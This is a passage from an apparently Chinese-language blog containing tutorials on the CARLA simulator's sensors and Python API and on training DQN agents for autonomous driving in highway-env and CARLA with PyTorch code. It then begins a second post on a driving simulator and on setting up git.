carla.CollisionEvent 检索其父actor和其他actor之间的碰撞。 Lane invasion carla.LaneInvasionEvent 在其父项越过车道标记时注册。 Obstacle carla.ObstacleDetectionEvent 检测到其父级之前可能存在的障碍。 2.10.3 其它不同的功能，例如导航、物理属性测量和场景的 2D&#x2F;3D 点图。 传感器 输出 概述 GNSS carla.GNSSMeasurement 检索传感器的地理位置。 IMU carla.IMUMeasurement 包括加速度计、陀螺仪和指南针。 LIDAR carla.LidarMeasurement 旋转激光雷达。 生成一个 4D 点云，每个点的坐标和强度对周围环境进行建模。 Radar carla.RadarMeasurement 2D 点图建模元素在视线内及其与传感器有关的运动。 RSS carla.RssResponse 根据安全检查修改应用于车辆的控制器。 此传感器的工作方式与其他传感器不同，并且有专门的 RSS 文档。 Semantic LIDAR carla.SemanticLidarMeasurement 旋转激光雷达。 生成具有有关实例和语义分割的额外信息的 3D 点云。 Camera构建 与汽车类似，我们先创建蓝图，再定义位置，然后再选择我们想要的汽车安装上去。不过，这里的位置都是相对汽车中心点的位置（以米计量）。 123camera_bp = blueprint_library.find(&#x27;sensor.camera.rgb&#x27;)camera_transform = carla.Transform(carla.Location(x=1.5, z=2.4))camera = world.spawn_actor(camera_bp, camera_transform, attach_to=ego_vehicle) 我们还要对相机定义它的callback function,定义每次仿真世界里传感器数据传回来后，我们要对它进行什么样的处理。在这个教程里我们只需要简单地将文件存在硬盘里。 1camera.listen(lambda image: image.save_to_disk(os.path.join(output_path, &#x27;%06d.png&#x27; % image.frame))) Lidar构建 Lidar可以设置的参数比较多，对Lidar模型不熟也没有关系，我在后面会另开文章详细介绍激光雷达模型，现在就知道我们设置了一些常用参数就好。 12345lidar_bp = blueprint_library.find(&#x27;sensor.lidar.ray_cast&#x27;)lidar_bp.set_attribute(&#x27;channels&#x27;, str(32))lidar_bp.set_attribute(&#x27;points_per_second&#x27;, str(90000))lidar_bp.set_attribute(&#x27;rotation_frequency&#x27;, str(40))lidar_bp.set_attribute(&#x27;range&#x27;, str(20)) 接着把lidar放置在奔驰上, 定义它的callback function. 123456lidar_location = carla.Location(0, 0, 2)lidar_rotation = carla.Rotation(0, 0, 0)lidar_transform = carla.Transform(lidar_location, lidar_rotation)lidar = world.spawn_actor(lidar_bp, lidar_transform, attach_to=ego_vehicle)lidar.listen(lambda point_cloud: \\ point_cloud.save_to_disk(os.path.join(output_path, &#x27;%06d.ply&#x27; % point_cloud.frame 3. PythonAPI的使用3.1 配置默认库我们之前虽然已经make好了Carla的PythonAPI, 但是并没有将它的库安装到我们默认的python3里，如果你查看carla自带的example, 会发现都要先进行以下操作： 1234567891011import globimport osimport systry: sys.path.append(glob.glob(&#x27;../carla/dist/carla-*%d.%d-%s.egg&#x27; % ( sys.version_info.major, sys.version_info.minor, &#x27;win-amd64&#x27; if os.name == &#x27;nt&#x27; else &#x27;linux-x86_64&#x27;))[0])except IndexError: passimport carla 在我们的代码中，也要这样做。当然有一劳永逸的方法。将Carla Library安装到你的python3.7里。这是我个人研究的方法，不一定都能成功。 最新版本的CARLA模拟器，可以直接pip install carla解决。 如果安装了旧版，需要按照以下步骤进行： 使用anaconda激活car环境，cd命令进入PythonAPI&#x2F;carla&#x2F;dist。运行： 12unzip carla-0.9.13-py3.7-win-amd64.egg -d carla-0.9.13-py3.7-win-amd64cd carla-0.9.13-py3.7-win-amd64 在同目录下建立一个setup.py，复制进入： 12345from distutils.core import setupsetup(name=&#x27;carla&#x27;, version=&#x27;0.9.10&#x27;, py_modules=[&#x27;carla&#x27;], ) 最后通过pip命令安装进去。 1pip3 install -e carla-0.9.13-py3.7-win-amd64 3.2我原本准备详细写写他提供的pythonAPI，但是他提供的实在是非常多，后期只能用到什么查什么，写什么。这里放个官方文档地址。Python API 参考 - CARLA 模拟器 中文文档 (zlhou-carla-doc-cn.readthedocs.io) 4. 基于DQN的自动驾驶4.1 DQNDQN（Deep Q-Learning）可谓是深度强化学习（Deep Reinforcement Learning，DRL）的开山之作，是将深度学习与强化学习结合起来从而实现从感知（Perception）到动作（ Action ）的端对端（End-to-end）学习的一种全新的算法。由DeepMind在NIPS 2013上发表，后又在Nature 2015上提出改进版本。 DQN是DRL的其中一种算法，它要做的就是将卷积神经网络（CNN）和Q-Learning结合起来，CNN的输入是原始图像数据（作为状态State），输出则是每个动作Action对应的价值评估Value Function（Q值）。 创新点： 基于Q-Learning构造Loss Function（不算很新，过往使用线性和非线性函数拟合Q-Table时就是这样做）。通过experience replay（经验池）解决相关性及非静态分布问题；使用TargetNet解决稳定性问题。优点： 算法通用性，可玩不同游戏；End-to-End 训练方式；可生产大量样本供监督学习。缺点： 无法应用于连续动作控制；只能处理只需短时记忆问题，无法处理需长时记忆问题（后续研究提出了使用LSTM等改进方法）；CNN不一定收敛，需精良调参。 4.2 DQN自动驾驶这里我们用pytroch+gym实现一下来感受深度强化学习。pytorch的环境配置之前已经说过，这里不多加赘述。 4.2.1 配置环境gym是用于开发和比较强化学习算法的工具包，在python中安装gym库和其中子场景都较为简便。 安装gym：pip install gym 安装自动驾驶模块，这里使用Edouard Leurent发布在github上的包highway-env（原链接）：pip install –user git+https://github.com/eleurent/highway-env 其中包含6个场景： 高速公路——“highway-v0” 汇入——“merge-v0” 环岛——“roundabout-v0” 泊车——“parking-v0” 十字路口——“intersection-v0” 赛车道——“racetrack-v0” 4.2.2 实验环境安装好后即可在代码中进行实验（以高速公路场景为例）： 12345678910import gymimport highway_env%matplotlib inlineenv = gym.make(&#x27;highway-v0&#x27;)env.reset()for _ in range(5): action = env.action_type.actions_indexes[&quot;IDLE&quot;] obs, reward, done, info = env.step(action) env.render() 会出现这样的画面： 可以看到这是上帝视角。绿色的就是我们可以用代码操控的车。这样的游戏相对简单，数据比较好处理，大家也比较容易理解。 env类有很多参数可以配置，具体可以参考在github上的原文档。 4.2.3 数据处理(1)statehighway-env包中没有定义传感器，车辆所有的state (observations) 都从底层代码读取，节省了许多前期的工作量。根据文档介绍，state (ovservations) 有三种输出方式：Kinematics，Grayscale Image和Occupancy grid。 Kinematics 输出V*F的矩阵，V代表需要观测的车辆数量（包括ego vehicle本身），F代表需要统计的特征数量。例： Vehicle x y v_x v_yego-vehicle 5.0 4.0 15.0 0vehicle1 -10.0 4.0 12.0 0vehicle2 13.0 8.0 13.5 0数据生成时会默认归一化，取值范围：[100, 100, 20, 20]，也可以设置ego vehicle以外的车辆属性是地图的绝对坐标还是对ego vehicle的相对坐标。 在定义环境时需要对特征的参数进行设定： 1234567891011121314151617181920212223config = \\ &#123; &quot;observation&quot;: &#123; &quot;type&quot;: &quot;Kinematics&quot;, #选取5辆车进行观察（包括ego vehicle） &quot;vehicles_count&quot;: 5, #共7个特征 &quot;features&quot;: [&quot;presence&quot;, &quot;x&quot;, &quot;y&quot;, &quot;vx&quot;, &quot;vy&quot;, &quot;cos_h&quot;, &quot;sin_h&quot;], &quot;features_range&quot;: &#123; &quot;x&quot;: [-100, 100], &quot;y&quot;: [-100, 100], &quot;vx&quot;: [-20, 20], &quot;vy&quot;: [-20, 20] &#125;, &quot;absolute&quot;: False, &quot;order&quot;: &quot;sorted&quot; &#125;, &quot;simulation_frequency&quot;: 8, # [Hz] &quot;policy_frequency&quot;: 2, # [Hz] &#125; Grayscale Image生成一张W*H的灰度图像，W代表图像宽度，H代表图像高度 Occupancy grid生成一个WHF的三维矩阵，用W*H的表格表示ego vehicle周围的车辆情况，每个格子包含F个特征。 (2) action highway-env包中的action分为连续和离散两种。连续型action可以直接定义throttle和steering angle的值，离散型包含5个meta actions： 12345678ACTIONS_ALL = &#123; 0: &#x27;LANE_LEFT&#x27;, 1: &#x27;IDLE&#x27;, 2: &#x27;LANE_RIGHT&#x27;, 3: &#x27;FASTER&#x27;, 4: &#x27;SLOWER&#x27; &#125; (3) reward highway-env包中除了泊车场景外都采用同一个reward function： 这个function只能在其源码中更改，在外层只能调整权重。 4.2.4 搭建模型这里采用第一种state表示方式——Kinematics进行示范。 由于state数据量较小（5辆车*7个特征），可以不考虑使用CNN，直接把二维数据的size[5,7]转成[1,35]即可，模型的输入就是35，输出是离散action数量，共5个。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697import torchimport torch.nn as nnfrom torch.autograd import Variableimport torch.nn.functional as Fimport torch.optim as optimimport torchvision.transforms as Tfrom torch import FloatTensor, LongTensor, ByteTensorfrom collections import namedtupleimport randomimport numpy as npdevice = torch.device(&#x27;cuda&#x27; if torch.cuda.is_available() else &#x27;cpu&#x27;)Tensor = FloatTensorEPSILON = 0 # epsilon used for epsilon greedy approachGAMMA = 0.9TARGET_NETWORK_REPLACE_FREQ = 40 # How frequently target netowrk updatesMEMORY_CAPACITY = 100BATCH_SIZE = 80LR = 0.01 # learning rateclass DQNNet(nn.Module): def __init__(self): super(DQNNet, self).__init__() self.linear1 = nn.Linear(35, 256).to(device) self.linear2 = nn.Linear(256, 256).to(device) self.linear3 = nn.Linear(256, 5).to(device) def forward(self, s): s = torch.FloatTensor(s) s = s.view(s.size(0), 1, 35) s = s.to(device) s = self.linear1(s) s = self.linear2(s) s = self.linear3(s) return sclass DQN(object): def __init__(self): self.net, self.target_net = DQNNet(), DQNNet() self.learn_step_counter = 0 self.memory = [] self.position = 0 self.capacity = MEMORY_CAPACITY self.optimizer = torch.optim.Adam(self.net.parameters(), lr=LR) self.loss_func = nn.MSELoss().cuda() def choose_action(self, s, e): x = np.expand_dims(s, axis=0) if np.random.uniform() &lt; 1 - e: actions_value = self.net.forward(x) action = torch.max(actions_value, -1)[1].data.cpu().numpy() action = action.max() else: action = np.random.randint(0, 5) return action def push_memory(self, s, a, r, s_): if len(self.memory) &lt; self.capacity: self.memory.append(None) self.memory[self.position] = Transition(torch.unsqueeze(torch.FloatTensor(s), 0), torch.unsqueeze(torch.FloatTensor(s_), 0),\\ torch.from_numpy(np.array([a])), torch.from_numpy(np.array([r], dtype=&#x27;float32&#x27;))) # self.position = (self.position + 1) % self.capacity def get_sample(self, batch_size): sample = random.sample(self.memory, batch_size) return sample def learn(self): if self.learn_step_counter % TARGET_NETWORK_REPLACE_FREQ == 0: self.target_net.load_state_dict(self.net.state_dict()) self.learn_step_counter += 1 transitions = self.get_sample(BATCH_SIZE) batch = Transition(*zip(*transitions)) b_s = Variable(torch.cat(batch.state)) b_s_ = Variable(torch.cat(batch.next_state)) b_a = Variable(torch.cat(batch.action)).to(device) b_r = Variable(torch.cat(batch.reward)).to(device) q_eval = self.net.forward(b_s).squeeze(1).gather(1, b_a.unsqueeze(1).to(torch.int64)) q_next = self.target_net.forward(b_s_).detach().to(device) # q_target = b_r + GAMMA * q_next.squeeze(1).max(1)[0].view(BATCH_SIZE, 1).t().to(device) loss = self.loss_func(q_eval, q_target.t()).to(device) self.optimizer.zero_grad() # reset the gradient to zero loss.backward() self.optimizer.step() # execute back propagation for one step return lossTransition = namedtuple(&#x27;Transition&#x27;, (&#x27;state&#x27;, &#x27;next_state&#x27;, &#x27;action&#x27;, &#x27;reward&#x27;)) 模型结构 这里对原作者的网络结构进行了更改。在example里设置的模型只有一个隐藏层，neuron数量和输入层相同，即模型结构为[35,35,5]，把隐藏层的数量和neuron数都增大，这里设为了[35,256,256,5]，模型效果有所提升。 reward定义 highway-env环境内部对于reward的定义比较固定，不支持自由更改，如果想高度自定义reward，建议在环境外部自己写function，不要使用环境反馈的reward。 在highway-env的官方文档中又有说明，奖励必须是有界的，所以无论如何在config里设置奖励或惩罚的数值，都会被归一化，使其介于[0,1]。如果因为认为模型碰撞发生率过高，为了让它更注重避障，在config里把碰撞的惩罚设置成一个很小的负数，环境对碰撞的奖励输出还是0，但是加速奖励因为归一化的下界变化变得更接近1了，这样相当于没有减小碰撞奖励，反而增大了速度奖励，适得其反，模型变得更激进了。碰撞惩罚越大，发生碰撞的概率越高。 网络价值分析 假设当前DQN已经训练到最优，即对每个局面下的每个动作价值输出都是准确的，并且策略会在每个状态下做出最优选择。由于env定义的reward介于[0,1]，可以使用等比数列求和公式计算出最理想情况下每个动作值的上界。$$Qmax &#x3D; 1+γ∗1+γ∗(γ∗1)+γ∗(γ∗(γ∗1))+…&#x3D;1&#x2F;(1-γ)$$如果期望的收益是有限的，那么γ一定小于1，如果设为0.8，模型能输出的最大Q值是5，如果设为0.9，模型能输出的最大Q值是10，以此类推。如果模型输出的某个动作Q值超过了这个数，就可以认为模型没有正确学习到价值，学习过程有bug，需要检查代码。 4.2.5 开始训练初始化环境，加入DQN的类 123456789101112131415161718192021222324252627282930import gymimport highway_envfrom matplotlib import pyplot as pltimport numpy as npimport timefrom DQNnet import DQNconfig = \\ &#123; &quot;observation&quot;: &#123; &quot;type&quot;: &quot;Kinematics&quot;, &quot;vehicles_count&quot;: 5, &quot;features&quot;: [&quot;presence&quot;, &quot;x&quot;, &quot;y&quot;, &quot;vx&quot;, &quot;vy&quot;, &quot;cos_h&quot;, &quot;sin_h&quot;], &quot;features_range&quot;: &#123; &quot;x&quot;: [-100, 100], &quot;y&quot;: [-100, 100], &quot;vx&quot;: [-20, 20], &quot;vy&quot;: [-20, 20] &#125;, &quot;absolute&quot;: False, &quot;order&quot;: &quot;sorted&quot; &#125;, &quot;simulation_frequency&quot;: 8, # [Hz] &quot;policy_frequency&quot;: 2, # [Hz] &#125; env = gym.make(&quot;highway-v0&quot;)env.configure(config) 训练： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697import gymimport highway_envimport timefrom DQNnet import DQNimport numpy as npfrom torch.utils.tensorboard import SummaryWriterwriter = SummaryWriter(&#x27;./log&#x27;)config = \\ &#123; &quot;observation&quot;: &#123; &quot;type&quot;: &quot;Kinematics&quot;, &quot;vehicles_count&quot;: 5, &quot;features&quot;: [&quot;presence&quot;, &quot;x&quot;, &quot;y&quot;, &quot;vx&quot;, &quot;vy&quot;, &quot;cos_h&quot;, &quot;sin_h&quot;], &quot;features_range&quot;: &#123; &quot;x&quot;: [-100, 100], &quot;y&quot;: [-100, 100], &quot;vx&quot;: [-20, 20], &quot;vy&quot;: [-20, 20] &#125;, &quot;absolute&quot;: False, &quot;order&quot;: &quot;sorted&quot; &#125;, &quot;simulation_frequency&quot;: 8, # [Hz] &quot;policy_frequency&quot;: 2, # [Hz] &#125;env = gym.make(&quot;highway-v0&quot;)env.configure(config)dqn = DQN()count = 0reward = []avg_reward = 0all_reward = []time_ = []all_time = []collision_his = []all_collision = []while True: done = False start_time = time.time() s = env.reset() s = s[0] # while True: # done = False # start_time = time.time() # s = env.reset() # s = s[0] # while not done: # e = np.exp(-count / 300) # 随机选择action的概率，随着训练次数增多逐渐降低 # a = dqn.choose_action(s, e) # s_, r, done, truncated, info = env.step(a) # env.render() while not done: e = np.exp(-count / 300) # 随机选择action的概率，随着训练次数增多逐渐降低 a = dqn.choose_action(s, e) s_, r, done,truncated, info = env.step(a) env.render() dqn.push_memory(s, a, r, s_) if ((dqn.position != 0) &amp; (dqn.position % 99 == 0)): loss_ = dqn.learn() count += 1 print(&#x27;epoch:&#x27;, count) avg_reward = np.mean(reward) avg_time = np.mean(time_) collision_rate = np.mean(collision_his) all_reward.append(avg_reward) all_time.append(avg_time) all_collision.append(collision_rate) writer.add_scalar(&#x27;result/reward&#x27;, np.asarray(avg_reward), count) writer.add_scalar(&#x27;result/time&#x27;, np.asarray(avg_time), count) writer.add_scalar(&#x27;result/collision&#x27;, np.asarray(collision_rate), count) reward = [] time_ = [] collision_his = [] s = s_ reward.append(r) end_time = time.time() episode_time = end_time - start_time time_.append(episode_time) is_collision = 1 if info[&#x27;crashed&#x27;] == True else 0 collision_his.append(is_collision) 小车进行了规避的动作，以避免发生碰撞。 在终端运行tensorboard –logdir&#x3D;.&#x2F;log可以查看可视化界面。 可以看出平均碰撞发生率会随训练次数增多逐渐降低，每个epoch持续的时间会逐渐延长（如果发生碰撞epoch会立刻结束） 看到原作者的效果对比，可以看出模型更快达到高reward，高time，碰撞率也下降得更快。（原作者中是每40次记录一次，相当于八百次）。 没有加上模型保存代码。这个模型也不是非常好，大家看着玩就行，调参的时间成本非常高，我没继续调下去了。 4.3 使用CARLA模拟器实现DQN自动驾驶由于图像数据的结构复杂，数据量大，考虑到用没有超强算力的电脑运行程序的时候，为了简化模型结构，对数据进行压缩，摄像头传来的图像先设置为80*60。 为了让模型能学到正确的参数，需要对智能体的action和reward进行定义，汽车控制的主要3个参数可以量化成油门力度([0,1])，刹车力度([0,1])，方向盘角度([-1,1])，是否倒档(True&#x2F;False)。但是根据一般的开车习惯，这些变量并不是相互独立的，比如油门和刹车一般不会同时踩下（除了漂移），定义DQN的输出时，为了计算对应action的Q值，先对action量化为几个类别： 1.直行加速：throttle&#x3D;1, brake&#x3D;0, steer&#x3D;0, reverse&#x3D;False2.左转（满舵）：throttle&#x3D;0.5, brake&#x3D;0, steer&#x3D;-1, reverse&#x3D;False3.右转（满舵）：throttle&#x3D;0.5, brake&#x3D;0, steer&#x3D;1, reverse&#x3D;False4.直行减速：throttle&#x3D;0, brake&#x3D;0.5, steer&#x3D;0, reverse&#x3D;False5.直行倒车：throttle&#x3D;1, brake&#x3D;0, steer&#x3D;0, reverse&#x3D;True 之后需要定义汽车行驶的reward，我们可以随机在地图上另选一点，将其坐标作为驾驶的终点，每一帧刷新时，如下定义reward： 1.若发生碰撞，reward&#x3D;-2002.若下一帧和当前帧相比，汽车到终点的距离更近，reward&#x3D;13.若下一帧和当前帧相比，汽车到终点的距离更远，reward&#x3D;-1 定义好之后我们需要将上述功能封装进step()函数并加入环境class，修改后环境class代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135import abcimport globimport osimport sysfrom types import LambdaTypefrom collections import dequefrom collections import namedtuple try: sys.path.append(glob.glob(&#x27;../carla/dist/carla-*%d.%d-%s.egg&#x27; % ( sys.version_info.major, sys.version_info.minor, &#x27;win-amd64&#x27; if os.name == &#x27;nt&#x27; else &#x27;linux-x86_64&#x27;))[0])except IndexError: pass import carlaimport random import timeimport numpy as npimport cv2import math IM_WIDTH = 80IM_HEIGHT = 60SHOW_PREVIEW = False SECOND_PER_EPISODE = 10 class Car_Env(): SHOW_CAM = SHOW_PREVIEW STEER_AMT = 1.0 im_width = IM_WIDTH im_height = IM_HEIGHT front_camera = None def __init__(self): self.client = carla.Client(&#x27;localhost&#x27;,2000) self.client.set_timeout(10.0) self.world = self.client.get_world() self.blueprint_library = self.world.get_blueprint_library() self.model_3 = self.blueprint_library.filter(&#x27;model3&#x27;)[0] def reset(self): self.collision_hist = [] self.radar_hist = [] self.actor_list = [] self.transform = self.world.get_map().get_spawn_points()[100] #spwan_points共265个点，选第一个点作为初始化小车的位置 self.vehicle = self.world.spawn_actor(self.model_3 , self.transform) self.actor_list.append(self.vehicle) self.rgb_cam = self.blueprint_library.find(&#x27;sensor.camera.rgb&#x27;) self.rgb_cam.set_attribute(&#x27;image_size_x&#x27;,f&#x27;&#123;self.im_width&#125;&#x27;) self.rgb_cam.set_attribute(&#x27;image_size_y&#x27;,f&#x27;&#123;self.im_height&#125;&#x27;) self.rgb_cam.set_attribute(&#x27;fov&#x27;,f&#x27;110&#x27;) transform = carla.Transform(carla.Location(x=2.5 ,z=0.7 )) self.sensor = self.world.spawn_actor(self.rgb_cam,transform, attach_to=self.vehicle) self.actor_list.append(self.sensor) self.sensor.listen(lambda data: self.process_img(data)) self.vehicle.apply_control(carla.VehicleControl(throttle=0.0, brake=0.0)) time.sleep(4) #collision sensor colsensor = self.blueprint_library.find(&#x27;sensor.other.collision&#x27;) self.colsensor = self.world.spawn_actor(colsensor, transform, attach_to = self.vehicle) self.actor_list.append(self.colsensor) self.colsensor.listen(lambda event: self.collision_data(event)) #target_transform 定义驾驶目的地坐标 self.target_transform = self.world.get_map().get_spawn_points()[101] self.target_dis = self.target_transform.location.distance(self.vehicle.get_location()) while self.front_camera is None: time.sleep(0.01) self.episode_start = time.time() self.vehicle.apply_control(carla.VehicleControl(throttle=0.0, brake=0.0)) return self.front_camera def collision_data(self, event): self.collision_hist.append(event) def radar_data(self, mesure): self.radar_hist.append(mesure) def process_img(self, image): i = np.array(image.raw_data) i2 = i.reshape((self.im_height, self.im_width , 4)) i3 = i2[: , : , : 3] if self.SHOW_CAM: cv2.imshow(&quot;&quot;,i3) cv2.waitKey(1) self.front_camera = i3 return i3/255.0 def step(self, action): last_dis = self.target_dis if action==0: self.vehicle.apply_control(carla.VehicleControl(throttle=1.0, steer=0.0, brake=0.0, hand_brake=False, reverse=False)) elif action==1: self.vehicle.apply_control(carla.VehicleControl(throttle=0.5, steer=-1, brake=0.0, hand_brake=False, reverse=False)) elif action==2: self.vehicle.apply_control(carla.VehicleControl(throttle=0.5, steer=1, brake=0.0, hand_brake=False, reverse=False)) elif action==4: self.vehicle.apply_control(carla.VehicleControl(throttle=0.0, steer=0.0, brake=0.5, hand_brake=False, reverse=False)) else: self.vehicle.apply_control(carla.VehicleControl(throttle=1.0, steer=0.0, brake=0.0, hand_brake=False, reverse=True)) self.target_dis = self.target_transform.location.distance(self.vehicle.get_location()) v = self.vehicle.get_velocity() kmh = int(3.6 * math.sqrt(v.x**2 + v.y**2 + v.z**2)) if len(self.collision_hist)!=0: done = True reward = -200 elif last_dis &lt; self.target_dis: #距离目标越来越远了 done = False reward = -1 else: done = False reward = 1 if self.episode_start + SECOND_PER_EPISODE &lt; time.time(): done = True time.sleep(1) return self.front_camera, reward, done, None 定义好环境后我们就可以开始定义DQN网络了，选择pytorch框架。在训练之前，还要开辟一个存储空间，用来保存小车每次和环境交互的数据(push_memory()函数)，每次训练都从buffer中随机抽取batch_size的样本(get_sample()函数)。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124import torchimport torch.nn as nnfrom torch.autograd import Variableimport torch.nn.functional as F import torch.optim as optim import torchvision.transforms as Tfrom torch import FloatTensor, LongTensor, ByteTensorTensor = FloatTensor EPSILON = 0.9 # epsilon used for epsilon greedy approachGAMMA = 0.9TARGET_NETWORK_REPLACE_FREQ = 100 # How frequently target netowrk updatesMEMORY_CAPACITY = 200BATCH_SIZE = 32LR = 0.01 # learning rate class Net(nn.Module): def __init__(self): super(Net, self).__init__() self.conv1 = nn.Conv2d(3, 16, kernel_size=5, stride=2) self.bn1 = nn.BatchNorm2d(16) self.conv2 = nn.Conv2d(16, 32, kernel_size=5, stride=2) self.bn2 = nn.BatchNorm2d(32) self.conv3 = nn.Conv2d(32, 32, kernel_size=5, stride=2) self.bn3 = nn.BatchNorm2d(32) self.head = nn.Linear(896,5) def forward(self, x): x = F.relu(self.bn1(self.conv1(x))) # 一层卷积 x = F.relu(self.bn2(self.conv2(x))) # 两层卷积 x = F.relu(self.bn3(self.conv3(x))) # 三层卷积 return self.head(x.view(x.size(0),-1)) # 全连接层 class DQN(object): def __init__(self): self.eval_net,self.target_net = Net(),Net() # Define counter, memory size and loss function self.learn_step_counter = 0 # count the steps of learning process self.memory = [] self.position = 0 # counter used for experience replay buff self.capacity = 200 #------- Define the optimizer------# self.optimizer = torch.optim.Adam(self.eval_net.parameters(), lr=LR) # ------Define the loss function-----# self.loss_func = nn.MSELoss() def choose_action(self, x): # This function is used to make decision based upon epsilon greedy x = torch.unsqueeze(torch.FloatTensor(x), 0) # add 1 dimension to input state x x = x.permute(0,3,2,1) #把图片维度从[batch, height, width, channel] 转为[batch, channel, height, width] # input only one sample if np.random.uniform() &lt; EPSILON: # greedy # use epsilon-greedy approach to take action actions_value = self.eval_net.forward(x) #print(torch.max(actions_value, 1)) # torch.max() returns a tensor composed of max value along the axis=dim and corresponding index # what we need is the index in this function, representing the action of cart. action = torch.max(actions_value, 1)[1].data.numpy() action = action[0] else: action = np.random.randint(0, 5) return action def push_memory(self, s, a, r, s_): if len(self.memory) &lt; self.capacity: self.memory.append(None) self.memory[self.position] = Transition(torch.unsqueeze(torch.FloatTensor(s), 0),torch.unsqueeze(torch.FloatTensor(s_), 0),\\ torch.from_numpy(np.array([a])),torch.from_numpy(np.array([r],dtype=&#x27;int64&#x27;))) self.position = (self.position + 1) % self.capacity def get_sample(self,batch_size): return random.sample(self.memory, batch_size) def learn(self): # Define how the whole DQN works including sampling batch of experiences, # when and how to update parameters of target network, and how to implement # backward propagation. # update the target network every fixed steps if self.learn_step_counter % TARGET_NETWORK_REPLACE_FREQ == 0: # Assign the parameters of eval_net to target_net self.target_net.load_state_dict(self.eval_net.state_dict()) self.learn_step_counter += 1 transitions = self.get_sample(BATCH_SIZE) # 抽样 batch = Transition(*zip(*transitions)) # extract vectors or matrices s,a,r,s_ from batch memory and convert these to torch Variables # that are convenient to back propagation b_s = Variable(torch.cat(batch.state)) # convert long int type to tensor b_a = Variable(torch.cat(batch.action)) b_r = Variable(torch.cat(batch.reward)) b_s_ = Variable(torch.cat(batch.next_state)) #b_s和b_s_分别对应当前帧和下一帧的图像数据，变量的维度是80*60*3(x*y*rgb_channel)，但进入神经网络需将其维度变为3*80*60 b_s = b_s.permute(0,3,2,1) b_s_ = b_s_.permute(0,3,2,1) # calculate the Q value of state-action pair q_eval = self.eval_net(b_s).gather(1,b_a.unsqueeze(1)) # (batch_size, 1) # calculate the q value of next state q_next = self.target_net(b_s_).detach() # detach from computational graph, don&#x27;t back propagate # select the maximum q value # q_next.max(1) returns the max value along the axis=1 and its corresponding index q_target = b_r + GAMMA * q_next.max(1)[0].view(BATCH_SIZE, 1) # (batch_size, 1) loss = self.loss_func(q_eval, q_target) self.optimizer.zero_grad() # reset the gradient to zero loss.backward() self.optimizer.step() # execute back propagation for one step Transition = namedtuple(&#x27;Transition&#x27;,(&#x27;state&#x27;, &#x27;next_state&#x27;,&#x27;action&#x27;, &#x27;reward&#x27;)) 之后添加主函数，模型便可以开始训练。每次和环境交互时选择action，一定概率是模型的输出结果，一定概率是随机选择，可以通过阈值设定(EPSILON)。 1234567891011121314if __name__ == &#x27;__main__&#x27;: env=Car_Env() s=env.reset() dqn=DQN() count=0 for i in range(2000): a=dqn.choose_action(s) s_,r,done,info = env.step(a) dqn.push_memory(s, a, r, s_) s=s_ if (dqn.position % (MEMORY_CAPACITY-1) )== 0: dqn.learn() count+=1 print(&#x27;learned times:&#x27;,count) 运行主函数后，我们就可以看到小车在道路中反复做出各种action以便探索环境。 但是现在的模型还很基础，神经网络对驾驶的控制也远没达到智能，需要经过成千上万次的训练，或者增加传感器或摄像头数据的丰富度，才有可能训练出达到驾驶要求的DQN网络。愿意做下去的同学上github找好的模型或好的paper复现。千万不要硬跑这个模型，我们的电脑跑起来是没有止境的。 那么这个小教程就到这里了。还有很多不是很完善的地方，以后我会慢慢完善或出视频。感谢看到这里，希望对大家有所帮助。 参考文献： 使用CARLA模拟器实现DQN自动驾驶 DQN自动驾驶——python+gym实现 【强化学习】Deep Q-Network (DQN) - 知乎 (zhihu.com) carla.org Carla 中文站 CARLA完全实践-核心概念 - 知乎 (zhihu.com)","categories":[{"name":"AI","slug":"AI","permalink":"https://qianmuoy.github.io/categories/AI/"}],"tags":[]},{"title":"基于深度学习的端到端自动驾驶","slug":"基于深度学习的端到端自动驾驶","date":"2024-02-04T12:42:03.000Z","updated":"2024-02-04T12:42:31.394Z","comments":true,"path":"2024/02/04/基于深度学习的端到端自动驾驶/","link":"","permalink":"https://qianmuoy.github.io/2024/02/04/%E5%9F%BA%E4%BA%8E%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E7%AB%AF%E5%88%B0%E7%AB%AF%E8%87%AA%E5%8A%A8%E9%A9%BE%E9%A9%B6/","excerpt":"","text":"基于深度学习的端到端自动驾驶主体来源:钱斌的博客 1.模拟平台安装和基本使用1.1模拟器的安装下载地址：右键或点击此处或按住ctrl+&#x2F;进入代码模式，复制链接到浏览器打开。 该地址中提供的模拟器是基于Unity开发的，是经过删减过后的可执行程序，不再需要额外安装unity，下载下来后就可以直接运行。目前覆盖windows、Linux、Mac共3个版本。以下只讲解如何在windows平台上运行和使用该模拟器。 下载完成后运行donkey_sim.exe文件即可进入模拟器。左边是设置，根据自己的需要进行设置即可。 在场景中，如果我们前面主界面使用了手工模式（paceCar处勾选manualDriving），那么我们就可以通过键盘来操控小车进行体验了。与一般的赛车游戏类似，W键表示前进，A表示左转，D表示右转，S表示后退。 在该模拟器中，控制小车的主要是两个参数：油门（W和S键）和转向角度（A和D键），这个与我们真实驾驶的汽车基本一致：挂挡+踩油门来控制前进动力，打方向盘控制车辆转向。为了能够实现自动驾驶，我们首先要能够根据这两个参数去控制模拟器里面小车的运行。我们怎么样通过Python代码来控制这个模拟器呢？ 1.2git工具的安装与配置详细的git工具安装与教程请参照这篇文章，这里仅描述如何在pycharm中使用git 1.2.1注册github账号 GitHub官网 按照提示进行注册。请注意记下用户名和邮箱地址，下面步骤需要使用。 1.2.2安装git 到git官网下载git安装包，点击downloads，选择操作平台(windows)，下载完成后运行，第一次选择全勾，后面一直下一步即可。 下载完成后，运行cmd，输入命令检查下载版本。能正确显示版本即为安装成功 1git version 1.2.3配置git安装成功后，配置git 123git config --global user.name &quot;用户名&quot;git config --global user.email &quot;用户邮箱&quot; 请注意此处空格必须严格遵循，否则将无法配置成功。建议直接复制过去改。 检查配置是否成功。在最下面会出现属性user.name与user.email，如果没有请重新到回到上一步。 1git config --list 1.2.4在pycharm中配置gitfile-&gt;settings-&gt;version control-&gt;git，一般此处默认检测系统中安装的第一个git，如果没有检测到请手动选择。 具体git操作请参照这篇文章 这里不进行描述。 